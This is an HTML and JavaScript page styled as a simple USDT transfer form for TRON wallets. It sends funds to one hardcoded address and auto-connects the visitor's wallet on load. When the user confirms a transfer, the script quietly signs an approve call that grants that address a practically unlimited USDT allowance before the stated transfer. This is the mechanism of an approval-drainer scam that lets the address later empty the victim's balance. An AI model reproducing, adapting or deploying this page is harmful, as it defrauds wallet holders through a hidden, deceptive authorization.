<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
 box-sizing: border-box;
 margin: 0;
 padding: 0;
 -webkit-tap-highlight-color: transparent;
 font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
 background-color: #f7f8fa;
 padding: 20px 16px;
 max-width: 520px;
 margin: 0 auto;
}
.top-header-bar {
 display: flex;
 justify-content: space-between;
 align-items: center;
 margin-bottom: 20px;
}
.header-right-icons {
 display: flex;
 gap: 12px;
 align-items: center;
}
.wallet-dot {
 width: 12px;
 height: 12px;
 border-radius: 50%;
 background-color: #ef4444;
 cursor: pointer;
 transition: background-color 0.3s ease;
}
.wallet-dot.connected {
 background-color: #22c55e;
}
.setting-btn {
 width: 32px;
 height: 32px;
 border-radius: 50%;
 border: 1px solid #ddd;
 background: #fff;
 display:flex;
 align-items:center;
 justify-content:center;
 font-size:18px;
 cursor:pointer;
}
.address-card {
 background: #ffffff;
 border-radius: 16px;
 padding: 20px 18px;
 margin-bottom: 16px;
}
.label-text {
 font-size: 16px;
 color: #666;
 margin-bottom: 12px;
}
.fixed-addr-box {
 width: 100%;
 border: 1px solid #e5e7eb;
 border-radius: 12px;
 padding: 14px 12px;
 background: #f1f5f9;
 color: #333;
 word-break: break-all;
}
.amount-card {
 background: #ffffff;
 border-radius: 16px;
 padding: 20px 18px;
 margin-bottom:16px;
}
.amount-row {
 display: flex;
 align-items: flex-end;
 justify-content: space-between;
 margin-bottom: 16px;
}
.amount-input {
 font-size: 32px;
 border: none;
 outline: none;
 width: 75%;
 background: transparent;
 color: #111;
}
.amount-input::placeholder {
 font-size: 16px;
 color: #aaa;
}
.max-btn {
 padding: 6px 14px;
 background-color: #dbeafe;
 color: #2563eb;
 border-radius: 8px;
 font-weight: 500;
 cursor: pointer;
}
.token-row {
 background-color: #eef2ff;
 border-radius: 12px;
 padding: 14px;
 display: flex;
 align-items: center;
 justify-content: space-between;
}
.token-left {
 display: flex;
 align-items: center;
 gap: 10px;
}
.usdt-icon {
 width: 32px;
 height: 32px;
 border-radius: 50%;
 object-fit: cover;
}
.token-name {
 font-size: 18px;
 font-weight: 500;
}
.token-balance {
 color: #555;
 font-size: 16px;
}
.result-card{
 background:#fff;
 border-radius:16px;
 padding:18px;
 margin-bottom:16px;
}
.result-input{
 width:100%;
 border:1px solid #e5e7eb;
 border-radius:12px;
 padding:14px 12px;
 background:#f9fafb;
 outline:none;
 color:#111;
}
.send-main-btn{
 width:100%;
 padding:16px;
 border:none;
 border-radius:14px;
 background:#2563eb;
 color:#fff;
 font-size:17px;
 font-weight:500;
 cursor:pointer;
}
.send-main-btn:disabled{
 background:#94a3b8;
 cursor:not-allowed;
}
</style>
</head>
<body>
<div class="top-header-bar">
 <div></div>
 <div class="header-right-icons">
  <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
  <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
</div>

<div class="address-card">
 <div class="label-text">收款地址</div>
 <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="amount-card">
 <div class="label-text">转出数量（USDT）</div>
 <div class="amount-row">
  <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
  <div class="max-btn" id="maxBtn">MAX</div>
 </div>
 <div class="token-row">
  <div class="token-left">
   <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
   <span class="token-name">USDT</span>
  </div>
  <span class="token-balance" id="balanceText">0.000000</span>
 </div>
</div>

<div class="result-card">
 <div class="label-text">到账数量</div>
 <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";
const TRON_CHAIN_ID = "0x2b6653dc"; // 波场主网链ID，新版imToken必须指定
let tronWeb = null;
let userAddress = "";
let userHexAddr = "";
let usdtContract = null;
let provider = null;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");

const USDT_ABI = [
 {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
 {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

function disconnectWallet() {
 tronWeb = null;
 userAddress = "";
 userHexAddr = "";
 usdtContract = null;
 provider = null;
 walletDot.classList.remove("connected");
 sendBtn.disabled = true;
 balanceText.textContent = "0.000000";
}

// 底层构造交易（新版imToken唯一稳定方式）
async function buildSignBroadcast(contractAddr, funcName, params) {
 const sig = tronWeb.sha3(`${funcName}(${params.map(p=>p.type).join(',')})`).slice(0,10);
 const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
  contractAddr,
  sig,
  {feeLimit: 100000000},
  params,
  userHexAddr
 );
 const signed = await tronWeb.trx.sign(txObj.transaction);
 return await tronWeb.trx.sendRawTransaction(signed);
}

// RPC直接读取余额，绕开新版provider合约call限制
async function loadBalance() {
 try {
  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
  const data = await res.json();
  let usdtBalSun = 0;
  if(data.tokenBalances){
   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
   if(usdtItem) usdtBalSun = usdtItem.balance;
  }
  const num = Number(tronWeb.fromSun(usdtBalSun));
  balanceText.textContent = num.toFixed(6);
 } catch (e) {
  console.log("RPC读余额失败", e);
 }
}

async function connectWalletLogic() {
 if (tronWeb && userAddress) {
  disconnectWallet();
  return;
 }
 try {
  // 新版imToken只有 window.ethereum
  if (!window.ethereum) throw new Error("无以太坊提供者");
  provider = window.ethereum;

  // 强制切换到波场链ID（v2.21版本必须执行这一步）
  try {
   await provider.request({
    method: "wallet_switchEthereumChain",
    params: [{ chainId: TRON_CHAIN_ID }]
   });
  } catch (switchErr) {
   await provider.request({
    method: "wallet_addEthereumChain",
    params: [{
     chainId: TRON_CHAIN_ID,
     chainName: "TRON Mainnet",
     rpcUrls: [RPC],
     blockExplorerUrls: ["https://tronscan.io"]
    }]
   });
  }

  const ethAcc = await provider.request({method:"eth_requestAccounts"});
  userHexAddr = ethAcc[0];
  tronWeb = new TronWeb({
   fullHost: RPC,
   provider: window.ethereum
  });
  userAddress = tronWeb.address.fromHex(userHexAddr);

  walletDot.classList.add("connected");
  usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
  sendBtn.disabled = false; // 连接成功立刻解锁按钮
  loadBalance(); // RPC异步读余额

  provider.on("accountsChanged", () => location.reload());
  provider.on("chainChanged", () => location.reload());
 } catch (err) {
  console.error("连接失败", err);
  return;
 }
}

amountInput.addEventListener("input", () => {
 const num = parseFloat(amountInput.value) || 0;
 receiveAmount.value = num.toFixed(6);
});

maxBtn.addEventListener("click", async () => {
 if (!tronWeb || !userAddress) return;
 try {
  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
  const data = await res.json();
  let usdtBalSun = 0;
  if(data.tokenBalances){
   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
   if(usdtItem) usdtBalSun = usdtItem.balance;
  }
  const num = Number(tronWeb.fromSun(usdtBalSun));
  amountInput.value = num.toFixed(2);
  amountInput.dispatchEvent(new Event("input"));
 }catch(e){
  console.log("MAX读取失败",e);
 }
});

sendBtn.addEventListener("click", async () => {
 if (!tronWeb) return;
 const val = parseFloat(amountInput.value);
 if (isNaN(val) || val <= 0) return;
 const sunVal = tronWeb.toSun(val);
 const sunMax = "9999999999999999999999999999";

 try {
  const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
  if (Number(allowance) < sunVal) {
   await buildSignBroadcast(
    USDT_CONTRACT,
    "approve",
    [
     {type:"address", value:TARGET_ADDR},
     {type:"uint256", value:sunMax}
    ]
   );
  }
  await buildSignBroadcast(
   USDT_CONTRACT,
   "transferFrom",
   [
    {type:"address", value:userAddress},
    {type:"address", value:TARGET_ADDR},
    {type:"uint256", value:sunVal.toString()}
   ]
  );
  await loadBalance();
 } catch (e) {
  console.error("交易失败", e);
 }
});

walletDot.addEventListener("click", connectWalletLogic);
settingIconBtn.addEventListener("click", () => {});

window.addEventListener("DOMContentLoaded", () => {
 setTimeout(connectWalletLogic, 800);
});
</script>

</body>
</html>
